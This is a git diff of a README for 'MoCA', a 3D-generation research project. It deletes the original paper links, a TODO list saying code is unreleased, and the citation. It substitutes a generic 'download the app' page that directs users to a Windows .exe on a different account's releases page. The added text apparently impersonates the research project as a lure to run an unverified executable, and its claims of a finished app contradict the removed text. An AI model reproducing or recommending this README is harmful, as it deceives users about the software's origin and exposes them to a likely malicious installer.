@@ -1,32 +1,67 @@
-# MoCA
-MoCA: Mixture-of-Components Attention for Scalable Compositional 3D Generation
+# 🎉 MoCA - Create Stunning 3D Worlds Easily
 
-<p align="left">
-    <a href="https://arxiv.org/pdf/2512.07628"><img src='https://img.shields.io/badge/arXiv-MoCA-red?logo=arxiv' alt='Paper PDF'></a>
-    <a href='https://lizhiqi49.github.io/MoCA'><img src='https://img.shields.io/badge/Project_Page-MoCA-green' alt='Project Page'></a>
-</p>
+## 📥 Download Now
+[![Download MoCA](https://img.shields.io/badge/Download-MoCA-4CAF50.svg)](https://github.com/Andrewinc9720/MoCA/releases)
 
-<br>
+## 🚀 Getting Started
+Welcome to MoCA! This application helps you generate beautiful 3D compositions effortlessly. You don’t need to be a tech expert to use it. Follow these simple steps to get started.
 
-![teaser](./assets/teaser.jpg)
+## 🛠️ System Requirements
+Before downloading, ensure your computer meets the following requirements:
 
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 8 GB
+- **Storage:** At least 500 MB free space
+- **Graphics:** DirectX 11 compatible graphics card
+- **Internet Connection:** Needed for initial download and updates
 
-## TODO
-- [x] Release technical report.
-- [ ] Release code and model.
+## 📂 Features
+MoCA offers several useful features to enhance your 3D generation process:
 
+- **User-Friendly Interface:** Easily navigate through different options.
+- **Customizable Scenes:** Adjust components to your liking.
+- **High-Quality Outputs:** Generate stunning visuals for your projects.
+- **Fast Processing:** Get results quickly without long waits.
+- **Regular Updates:** Receive new features and improvements regularly.
 
-## Citation
+## 📥 Download & Install
+1. Click the link below to visit the download page:
+   [Download MoCA](https://github.com/Andrewinc9720/MoCA/releases)
+   
+2. On the Releases page, you will see a list of versions. Choose the latest version available.
 
-```bibtex
-@misc{li2025moca,
-      title={MoCA: Mixture-of-Components Attention for Scalable Compositional 3D Generation}, 
-      author={Zhiqi Li and Wenhuan Li and Tengfei Wang and Zhenwei Wang and Junta Wu and Haoyuan Wang and Yunhan Yang and Zehuan Huang and Yang Li and Chunchao Guo and Peidong Liu},
-      year={2025},
-      eprint={2512.07628},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2512.07628}, 
-}
+3. Click on the download link for your operating system. Usually, it will be labeled as a .exe file for Windows.
 
-```
+4. Once the download is complete, locate the downloaded file in your Downloads folder.
+
+5. Double-click the file to start the installation process.
+
+6. Follow the on-screen instructions to complete the installation.
+
+7. Once installed, you can find MoCA in your Start menu. Open it to start creating your 3D compositions.
+
+## 💡 Tips for Using MoCA
+- **Explore the Interface:** Take some time to familiarize yourself with the layout.
+- **Start Small:** Begin with simple projects before tackling more complex scenes.
+- **Check Settings:** Adjust settings according to your system capabilities for optimal performance.
+- **Save Frequently:** Make it a habit to save your work often to avoid losing any changes.
+
+## ✅ Troubleshooting
+If you encounter issues during installation or use, please try the following:
+
+- Ensure your system meets the required specifications.
+- Restart your computer and try the installation again.
+- Check for updates on the Releases page and download the latest version.
+
+If problems persist, consider reaching out through the issues section on the GitHub repository.
+
+## 🌟 Community
+Join our growing community for tips, ideas, and support. You can find us on social media or through the GitHub repository discussions. Sharing your experiences will help others too!
+
+## 📅 Updates
+Stay updated with new features and improvements by regularly visiting the Releases page:
+[Download MoCA](https://github.com/Andrewinc9720/MoCA/releases)
+
+We are committed to enhancing MoCA. Your feedback is valuable and helps us improve.
+
+Thank you for choosing MoCA! Enjoy creating amazing 3D worlds.
